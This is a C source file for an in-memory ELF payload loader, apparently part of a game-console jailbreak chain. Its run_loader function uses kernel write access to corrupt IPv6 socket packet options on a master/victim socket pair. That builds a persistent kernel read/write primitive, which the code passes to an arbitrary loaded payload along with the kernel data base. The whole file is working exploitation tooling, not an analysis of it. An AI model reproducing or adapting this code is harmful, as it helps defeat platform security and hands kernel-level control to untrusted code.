#include "loader.h"
#include "api.h"
#include "kernel.h"
#include "logger.h"
#include <elf.h>

loader_ctx_t loader_ctx = {0};

int init_loader(char *ptr, size_t size) {
  if (ptr == 0) {
    log("empty elf !!");
    return -1;
  }

  log("init loader started...");

  Elf64_Ehdr *ehdr = (Elf64_Ehdr *)ptr;
  Elf64_Phdr *phdr = (Elf64_Phdr *)(ptr + ehdr->e_phoff);
  Elf64_Shdr *shdr = (Elf64_Shdr *)(ptr + ehdr->e_shoff);

  if (size < sizeof(Elf64_Ehdr) || size < sizeof(Elf64_Phdr) + ehdr->e_phoff ||
      size < sizeof(Elf64_Shdr) + ehdr->e_shoff) {
    log("truncated ELF !!");
    return -1;
  }

  if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
    log("ELF signature mismatch !!");
    return -1;
  }

  for (int i = 0; i < ehdr->e_phnum; i++) {
    if (phdr[i].p_offset + phdr[i].p_filesz > size) {
      log("truncated ELF !!");
      return -1;
    }
  }

  size_t min_vaddr = -1;
  size_t max_vaddr = 0;

  // Compute size of virtual memory region.
  for (int i = 0; i < ehdr->e_phnum; i++) {
    if (phdr[i].p_vaddr < min_vaddr) {
      min_vaddr = phdr[i].p_vaddr;
    }

    if (max_vaddr < phdr[i].p_vaddr + phdr[i].p_memsz) {
      max_vaddr = phdr[i].p_vaddr + phdr[i].p_memsz;
    }
  }

  min_vaddr = ALIGN_DOWN(min_vaddr, PAGE_SIZE);
  max_vaddr = ALIGN_UP(max_vaddr, PAGE_SIZE);

  loader_ctx.size = max_vaddr - min_vaddr;

  int flags = MAP_PRIVATE | MAP_ANONYMOUS;
  int prot = PROT_READ | PROT_WRITE;
  if (ehdr->e_type == ET_DYN) {
    loader_ctx.base = 0;
  } else if (ehdr->e_type == ET_EXEC) {
    loader_ctx.base = min_vaddr;
    flags |= MAP_FIXED;
  } else {
    log("unsupported ELF type !!");
    return -1;
  }

  loader_ctx.base = mmap(loader_ctx.base, loader_ctx.size, prot, flags, -1, 0);
  if (loader_ctx.base == UINTPTR_MAX) {
    log("unable to map memory with size %#x prot: %#x flags: %#x !!",
        loader_ctx.size, prot, flags);
    return -1;
  }

  // Parse program headers.
  for (int i = 0; i < ehdr->e_phnum; i++) {
    if (phdr[i].p_type == PT_LOAD) {
      if (!phdr[i].p_memsz || !phdr[i].p_filesz)
        continue;

      memcpy(loader_ctx.base + phdr[i].p_vaddr, ptr + phdr[i].p_offset,
             phdr[i].p_filesz);
    }
  }

  // Apply relocations.
  for (int i = 0; i < ehdr->e_shnum; i++) {
    if (shdr[i].sh_type != SHT_RELA)
      continue;

    Elf64_Rela *rela = (Elf64_Rela *)(ptr + shdr[i].sh_offset);
    for (int j = 0; j < (int)(shdr[i].sh_size / sizeof(Elf64_Rela)); j++) {
      if ((rela[j].r_info & 0xffffffff) == R_X86_64_RELATIVE) {
        *(uintptr_t *)(loader_ctx.base + rela[j].r_offset) =
            loader_ctx.base + rela[j].r_addend;
      }
    }
  }

  // Set protection bits on mapped segments.
  for (int i = 0; i < ehdr->e_phnum; i++) {
    if (phdr[i].p_type != PT_LOAD || !phdr[i].p_memsz)
      continue;

    uintptr_t segment_addr = loader_ctx.base + phdr[i].p_vaddr;
    size_t segment_size = ALIGN_UP(phdr[i].p_memsz, PAGE_SIZE);
    uint8_t prot = PFLAGS(phdr[i].p_flags);

    if (prot & PROT_EXEC) {
      if (vm_map_set_protection(segment_addr, segment_size, prot) == -1) {
        log("unable to set protection to %#x for mapped memory %#lx with "
            "size %#lx",
            prot, segment_addr, segment_size);
        munmap(loader_ctx.base, loader_ctx.size);
        return -1;
      }
    } else {
      if (mprotect(segment_addr, segment_size, prot) == -1) {
        log("unable to set protection to %#x for mapped memory %#lx with "
            "size %#lx",
            prot, segment_addr, segment_size);
        munmap(loader_ctx.base, loader_ctx.size);
        return -1;
      }
    }
  }

  loader_ctx.entry = loader_ctx.base + ehdr->e_entry;

  log("loader_ctx { base: %#lx size: %#lx entry: %#lx }", loader_ctx.base,
      loader_ctx.size, loader_ctx.entry);

  log("init loader completed !!");
  return 0;
}

int run_loader() {
  char in6_pktinfo_buf[0x14];
  char cmsghdr_buf[0x18];
  int rwpair[2];
  int rwpipe[2];
  int payloadout;

  log("run loader started...");

  log("init loader args started...");

  rwpair[0] = socket(AF_INET6, SOCK_DGRAM, 0);
  if (rwpair[0] == -1) {
    log("unable to create master socket !!");
    return -1;
  }

  rwpair[1] = socket(AF_INET6, SOCK_DGRAM, 0);
  if (rwpair[1] == -1) {
    log("unable to create victim socket !!");
    return -1;
  }

  memset(cmsghdr_buf, 0, sizeof(cmsghdr_buf));

  uint32_t *cmsghdr = (uint32_t *)cmsghdr_buf;

  cmsghdr[0] = 0x14;         // cmsg_len
  cmsghdr[1] = IPPROTO_IPV6; // cmsg_level
  cmsghdr[2] = IPV6_TCLASS;  // cmsg_type

  if (setsockopt(rwpair[0], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, cmsghdr_buf,
                 sizeof(cmsghdr_buf)) == -1) {
    log("unable to set socket option IPV6_2292PKTOPTIONS !!");
    return -1;
  }

  memset(in6_pktinfo_buf, 0, sizeof(in6_pktinfo_buf));

  if (setsockopt(rwpair[1], IPPROTO_IPV6, IPV6_PKTINFO, in6_pktinfo_buf,
                 sizeof(in6_pktinfo_buf)) == -1) {
    log("unable to set socket option IPV6_PKTINFO !!");
    return -1;
  }

  fhold(fget(rwpair[0]));
  fhold(fget(rwpair[1]));

  uintptr_t master_in6p_outputopts = get_in6p_outputopts(rwpair[0]);
  uintptr_t victim_in6p_outputopts = get_in6p_outputopts(rwpair[1]);

  uintptr_t victim_ip6po_pktinfo = victim_in6p_outputopts + 0x10;

  // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
  kwrite(master_in6p_outputopts + 0x10, &victim_ip6po_pktinfo,
         sizeof(victim_ip6po_pktinfo));

  uint32_t tclass = 0x13370000;

  // pktopts.ip6po_tclass = 0x13370000
  kwrite(master_in6p_outputopts + 0xc0, &tclass, sizeof(tclass));

  if (pipe2(rwpipe, 0) == -1) {
    log("unable to pipe2 !!");
    return -1;
  }

  uintptr_t rpipe_fp = fget(rwpipe[0]);
  uintptr_t rpipe_f_data;

  kread(&rpipe_f_data, rpipe_fp, sizeof(rpipe_f_data));

  void *kernel_getpid;
  if (dlsym(LIBKERNEL_HANDLE, "getpid", &kernel_getpid) == -1) {
    log("unable to dlsym getpid !!");
    return -1;
  }

  uintptr_t kernel_data_base = get_kernel_data_base();
  if (kernel_data_base == 0) {
    log("unable to get kernel data base !!");
    return -1;
  }

  elfldr_args_t elfldr_args = {
      .syscall_wrapper = kernel_getpid,
      .rwpipe = rwpipe,
      .rwpair = rwpair,
      .pipe_f_data = rpipe_f_data,
      .kernel_data_base = kernel_data_base,
      .payloadout = &payloadout
  };

  log("elfldr_args { syscall_wrapper: %#lx rwpipe: [%i, %i] rwpair: [%i, "
      "%i] pipe_f_data: %#lx kernel_data_base: %#lx }",
      elfldr_args.syscall_wrapper, elfldr_args.rwpipe[0], elfldr_args.rwpipe[1],
      elfldr_args.rwpair[0], elfldr_args.rwpair[1], elfldr_args.pipe_f_data,
      elfldr_args.kernel_data_base);

  log("init loader args completed !!");

  int ret = loader_ctx.entry(&elfldr_args);

  log("elfldr payloadout %i !!", payloadout);
  log("elfldr returned %i !!", ret);

  log("loader args cleanup started...");

  munmap(loader_ctx.base, loader_ctx.size);

  remove_pktinfo_from_so(rwpair[0]);

  close(rwpair[0]);
  close(rwpair[1]);
  close(rwpipe[0]);
  close(rwpipe[1]);

  log("loader args cleanup completed !!");

  log("run loader completed !!");

  return 0;
}